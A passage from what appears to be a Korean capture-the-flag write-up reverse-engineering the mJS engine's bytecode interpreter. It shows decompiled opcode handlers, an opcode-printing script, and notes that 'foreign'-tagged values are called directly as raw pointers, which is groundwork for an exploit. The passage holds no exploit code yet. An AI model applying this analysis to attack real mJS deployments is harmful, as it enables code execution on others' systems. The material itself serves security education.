</span></span><span style="display:flex;"><span>str_ <span style="color:#f92672">=</span> (str_<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;,&#39;</span>))
</span></span><span style="display:flex;"><span>OPCODE <span style="color:#f92672">=</span> [<span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">35</span>]
</span></span><span style="display:flex;"><span><span style="color:#75715e"># OPCODE =[36, 11, 9, 22, 35]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># OPCODE = [36, 11, 10, 23, 11, 9, 11, 9, 22, 24]</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> op <span style="color:#f92672">in</span> OPCODE:
</span></span><span style="display:flex;"><span>    k<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> str_:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> op <span style="color:#f92672">==</span> k:
</span></span><span style="display:flex;"><span>            print(i[i<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;OP_&#34;</span>):] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; = &#39;</span><span style="color:#f92672">+</span> hex(k))
</span></span><span style="display:flex;"><span>        k<span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>root<span style="color:#960050;background-color:#1e0010">@</span>ed1ff428eb33 <span style="color:#f92672">~/</span>Desktop<span style="color:#f92672">/</span>Kalmar<span style="color:#f92672">/</span>MJS <span style="color:#f92672">-</span> KalmarCTF
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">❯</span> python3 print_opcode.py
</span></span><span style="display:flex;"><span>OP_BCODE_HEADER <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x24</span>
</span></span><span style="display:flex;"><span>OP_PUSH_STR <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xb</span>
</span></span><span style="display:flex;"><span>OP_FIND_SCOPE <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x9</span>
</span></span><span style="display:flex;"><span>OP_GET <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x16</span>
</span></span><span style="display:flex;"><span>OP_ARGS <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x25</span>
</span></span><span style="display:flex;"><span>OP_PUSH_STR <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xb</span>
</span></span><span style="display:flex;"><span>OP_CALL <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d</span>
</span></span><span style="display:flex;"><span>OP_EXIT <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x23</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xBu</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        length <span style="color:#f92672">=</span> <span style="color:#a6e22e">cs_varint_decode_unsafe</span>(<span style="color:#f92672">&amp;</span>code[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span>llen_4);
</span></span><span style="display:flex;"><span>        v55 <span style="color:#f92672">=</span> mjsa;
</span></span><span style="display:flex;"><span>        v16 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_string</span>(mjsa, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>code[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> llen_4], length, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_push</span>(v55, v16);
</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">+=</span> length <span style="color:#f92672">+</span> llen_4;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span></code></pre></div><p>OP_PUSH_STR은 그냥 문자열을 약간의 가공을 해서 스택에 push하는 명령이다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0xfff700746e697270</span>
</span></span></code></pre></div><p>뒤에는 그냥 아스키고 앞에 0xfff7을 추가해준다.
길이에 따라 로직이 다르지만, print 문자열에 한에서는 위 값이 push된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">mjs_push</span>(mjs <span style="color:#f92672">*</span>mjs, <span style="color:#66d9ef">mjs_val_t</span> v)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">push_mjs_val</span>(<span style="color:#f92672">&amp;</span>mjs<span style="color:#f92672">-&gt;</span>stack, v);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">push_mjs_val</span>(mbuf <span style="color:#f92672">*</span>m, <span style="color:#66d9ef">mjs_val_t</span> v)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">mjs_val_t</span> va; <span style="color:#75715e">// [rsp+0h] [rbp-10h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mbuf <span style="color:#f92672">*</span>ma; <span style="color:#75715e">// [rsp+8h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  ma <span style="color:#f92672">=</span> m;
</span></span><span style="display:flex;"><span>  va <span style="color:#f92672">=</span> v;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">mbuf_append</span>(m, <span style="color:#f92672">&amp;</span>va, <span style="color:#ae81ff">8uLL</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">size_t</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">mbuf_append</span>(mbuf <span style="color:#f92672">*</span>a, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">size_t</span> len)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">mbuf_insert</span>(a, a<span style="color:#f92672">-&gt;</span>len, buf, len);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>OP_FIND_SCOPE는 현재 스코프를 찾는 명령이다.
OP_CREATE 같은 명령을 수행할때, SCOPE에 값이 추가된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0xfff1561eb4251558</span>
</span></span></code></pre></div><p>vm stack에 push 되는 값은 위와 같은 주소값이다.
0xfff1이 마스크? 이고 하위 6바이트가 주소로 쓰인다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">mjs_is_object</span>(<span style="color:#66d9ef">mjs_val_t</span> v)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">bool</span> v2; <span style="color:#75715e">// [rsp+1h] [rbp-9h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (v <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFF000000000000LL</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xFFF1000000000000LL</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (v <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFF000000000000LL</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xFFFC000000000000LL</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v2;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>mjs_is_object 함수가 비교하는 것을 보면, 오브젝트임을 알 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">mjs_is_object</span>(<span style="color:#66d9ef">mjs_val_t</span> v) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (v <span style="color:#f92672">&amp;</span> MJS_TAG_MASK) <span style="color:#f92672">==</span> MJS_TAG_OBJECT <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>         (v <span style="color:#f92672">&amp;</span> MJS_TAG_MASK) <span style="color:#f92672">==</span> MJS_TAG_ARRAY;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>OP_GET은 함수의 주소를 찾을때 사용하는 명령어이다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>	  <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x16u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        obj_0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjsa);                  <span style="color:#75715e">// SCOPE 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        key_1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjsa);                  <span style="color:#75715e">// ENCODED STR
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        val_0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xFFF3000000000000LL</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">getprop_builtin</span>(mjsa, obj_0, key_1, <span style="color:#f92672">&amp;</span>val_0) )<span style="color:#75715e">// NOT PROPERTY BUILTIN
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mjs_is_object</span>(obj_0) )
</span></span><span style="display:flex;"><span>            val_0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_v_proto</span>(mjsa, obj_0, key_1);<span style="color:#75715e">// OBJECT -&gt; GET PROTO
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mjs_prepend_errorf</span>(mjsa, MJS_TYPE_ERROR, <span style="color:#e6db74">&#34;type error&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_push</span>(mjsa, val_0);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( prev_opcode <span style="color:#f92672">==</span> <span style="color:#ae81ff">9</span> )
</span></span><span style="display:flex;"><span>          mjsa<span style="color:#f92672">-&gt;</span>vals.last_getprop_obj <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xFFF3000000000000LL</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>          mjsa<span style="color:#f92672">-&gt;</span>vals.last_getprop_obj <span style="color:#f92672">=</span> obj_0;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span></code></pre></div><p>그 scope의 object에서 key값으로 값을 찾아서 proto?를 얻어서 vm stack에 push한다.</p>
<p>OP_ARGS는 그냥 인자를 맞춰주는 부분이다.
분석은 안했다.</p>
<p>OP_CALL은 함수를 호출해준다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x1Du</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        retval_stack_idx <span style="color:#f92672">=</span> <span style="color:#a6e22e">vtop</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>arg_stack);
</span></span><span style="display:flex;"><span>        func_pos <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_int</span>(mjsa, retval_stack_idx) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        func <span style="color:#f92672">=</span> <span style="color:#a6e22e">vptr</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>stack, func_pos);    <span style="color:#75715e">// get pointer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">mjs_pop_val</span>(<span style="color:#f92672">&amp;</span>mjsa<span style="color:#f92672">-&gt;</span>arg_stack);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mjs_is_function</span>(<span style="color:#f92672">*</span>func) )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">call_stack_push_frame</span>(mjsa, i <span style="color:#f92672">+</span> bp_0.start_idx, retval_stack_idx);
</span></span><span style="display:flex;"><span>          off_call <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_func_addr</span>(<span style="color:#f92672">*</span>func) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>          bp_0 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">mjs_bcode_part_get_by_offset</span>(mjsa, off_call);
</span></span><span style="display:flex;"><span>          code <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span>)bp_0.data.p;
</span></span><span style="display:flex;"><span>          i <span style="color:#f92672">=</span> off_call <span style="color:#f92672">-</span> bp_0.start_idx;
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">*</span>func <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xFFF3000000000000LL</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mjs_is_ffi_sig</span>(<span style="color:#f92672">*</span>func) )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">call_stack_push_frame</span>(mjsa, i <span style="color:#f92672">+</span> bp_0.start_idx, retval_stack_idx);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">mjs_ffi_call2</span>(mjsa);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">call_stack_restore_frame</span>(mjsa);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mjs_is_foreign</span>(<span style="color:#f92672">*</span>func) )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">call_stack_push_frame</span>(mjsa, i <span style="color:#f92672">+</span> bp_0.start_idx, retval_stack_idx);
</span></span><span style="display:flex;"><span>          ptr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">*</span>)(mjs <span style="color:#f92672">*</span>))<span style="color:#a6e22e">mjs_get_ptr</span>(mjsa, <span style="color:#f92672">*</span>func);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">ptr</span>(mjsa);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">call_stack_restore_frame</span>(mjsa);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">mjs_set_errorf</span>(mjsa, MJS_TYPE_ERROR, <span style="color:#e6db74">&#34;calling non-callable&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_93;
</span></span></code></pre></div><p>mjs_print는 foreign이다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">mjs_is_foreign</span>(<span style="color:#66d9ef">mjs_val_t</span> v)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (v <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFF000000000000LL</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xFFF2000000000000LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>OP_GET에서 가져온 함수의 주소의 마스크가 0xfff2이기 때문이다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">mjs_get_ptr</span>(mjs <span style="color:#f92672">*</span>mjs, <span style="color:#66d9ef">mjs_val_t</span> v)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mjs_is_foreign</span>(v) )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">get_ptr</span>(v);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">get_ptr</span>(<span style="color:#66d9ef">mjs_val_t</span> v)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)(v <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFFFFFFLL</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>실제로 ptr을 가져올때 마스크는 빼고 본다.
즉 실제 주소를 가져와서 그냥 호출한다.</p>
<p>OP_EXPR은 어떤 변수에 저장할때 있었던 OPCODE이다.
OP_EXPR도 한번 살펴보면, 다음과 같다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x18u</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        op <span style="color:#f92672">=</span> code[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exec_expr</span>(mjsa, op);
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">++</span>i;
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">exec_expr</span>(mjs <span style="color:#f92672">*</span>mjs, <span style="color:#66d9ef">int</span> op)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">mjs_val_t</span> v2; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v3; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v4; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> is_truthy; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v6; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v7; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v8; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v9; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v10; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v11; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v12; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v13; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v14; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v15; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v16; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v17; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v18; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v19; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v20; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v21; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v22; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v23; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v24; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v25; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v26; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v27; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v28; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v29; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v30; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v31; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v32; <span style="color:#75715e">// [rsp+18h] [rbp-228h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v; <span style="color:#75715e">// [rsp+28h] [rbp-218h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v34; <span style="color:#75715e">// [rsp+38h] [rbp-208h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v35; <span style="color:#75715e">// [rsp+48h] [rbp-1F8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v_2; <span style="color:#75715e">// [rsp+110h] [rbp-130h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> key_3; <span style="color:#75715e">// [rsp+118h] [rbp-128h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> obj_3; <span style="color:#75715e">// [rsp+120h] [rbp-120h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v_1; <span style="color:#75715e">// [rsp+128h] [rbp-118h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> key_2; <span style="color:#75715e">// [rsp+130h] [rbp-110h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> obj_2; <span style="color:#75715e">// [rsp+138h] [rbp-108h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v1_0; <span style="color:#75715e">// [rsp+140h] [rbp-100h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> key_1; <span style="color:#75715e">// [rsp+150h] [rbp-F0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> obj_1; <span style="color:#75715e">// [rsp+158h] [rbp-E8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> v1; <span style="color:#75715e">// [rsp+160h] [rbp-E0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> key_0; <span style="color:#75715e">// [rsp+170h] [rbp-D0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> obj_0; <span style="color:#75715e">// [rsp+178h] [rbp-C8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> ival; <span style="color:#75715e">// [rsp+188h] [rbp-B8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> ikey; <span style="color:#75715e">// [rsp+18Ch] [rbp-B4h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> key; <span style="color:#75715e">// [rsp+190h] [rbp-B0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> obj; <span style="color:#75715e">// [rsp+198h] [rbp-A8h]
